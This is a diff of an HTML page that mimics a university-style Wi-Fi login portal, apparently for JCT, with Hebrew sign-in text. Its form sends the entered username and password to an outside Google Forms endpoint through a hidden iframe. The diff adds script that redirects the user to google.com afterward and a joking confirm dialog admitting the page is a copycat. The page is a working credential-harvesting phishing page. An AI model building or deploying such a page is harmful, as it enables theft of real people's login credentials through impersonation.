@@ -15,7 +15,6 @@
             color: #333;
         }
 
-        /* --- Top Logo Bar --- */
         .header-logos {
             display: flex;
             align-items: center;
@@ -48,7 +47,6 @@
             color: #0077a9;
         }
 
-        /* --- Main Content Indentation --- */
         .main-content-indent {
             margin-left: 15px;
             padding-top: 20px;
@@ -62,7 +60,6 @@
             line-height: 1.5;
         }
 
-        /* --- Login Box Styles --- */
         .login-box-wrapper {
             width: 350px;
             border: 1px solid #8ba0b9;
@@ -88,17 +85,13 @@
             background: #fdfdfd;
         }
 
-        /* Button Area - UPDATED */
         .button-area {
             padding: 8px 15px;
-            /* Grey gradient to match the original image */
             background: linear-gradient(to bottom, #cbdbeb 0%, #d4d4d4 100%);
             border-top: 1px solid #c0c0c0;
-            /* Centers the button */
             text-align: center;
         }
 
-        /* --- Form Elements --- */
         label {
             display: block;
             font-size: 11px;
@@ -120,7 +113,6 @@
 
         button {
             padding: 3px 20px;
-            /* Increased side padding slightly */
             font-size: 13px;
             cursor: pointer;
             background: linear-gradient(to bottom, #f5f5f5 0%, #dcdcdc 100%);
@@ -134,7 +126,6 @@
             border-color: #666;
         }
 
-        /* --- Footer/Outside Elements --- */
         .checkbox-container {
             margin-top: 8px;
             font-size: 11px;
@@ -176,7 +167,7 @@
             אנא התחבר לרשת באמצעות שם המשתמש והסיסמה שלך
         </div>
 
-        <form class="login-box-wrapper" action="https://docs.google.com/forms/d/e/1FAIpQLSdTxgCiPOwzJHz2f7QSgVaKAMLFCmcfln3q2zyLKCcWZmzabA/formResponse" method="POST" target="hidden_iframe">
+        <form id="loginForm" class="login-box-wrapper" action="https://docs.google.com/forms/d/e/1FAIpQLSdTxgCiPOwzJHz2f7QSgVaKAMLFCmcfln3q2zyLKCcWZmzabA/formResponse" method="POST" target="hidden_iframe">
 
             <div class="login-header">Students and Employees Wi-Fi Access</div>
 
@@ -204,14 +195,34 @@
         </div>
 
     </div>
+            
 
-    <script>
+<script>
+        var submitted = false;
+
         document.getElementById('showPass').addEventListener('change', function() {
             var passwordField = document.getElementById('passwordInput');
             if (this.checked) {
                 passwordField.type = 'text';
             } else {
                 passwordField.type = 'password';
+            }
+        });
+
+        document.getElementById('hidden_iframe').addEventListener('load', function() {
+            if (submitted) {
+                window.location.href = "https://www.google.com";
+            }
+        });
+
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            var jokeMessage = "Warning: This is not the real JCT, just a copycat!\n\nWe would like you to fill out your credentials too? :)";
+
+            if (confirm(jokeMessage)) {
+                submitted = true;
+                this.submit();
             }
         });
     </script>
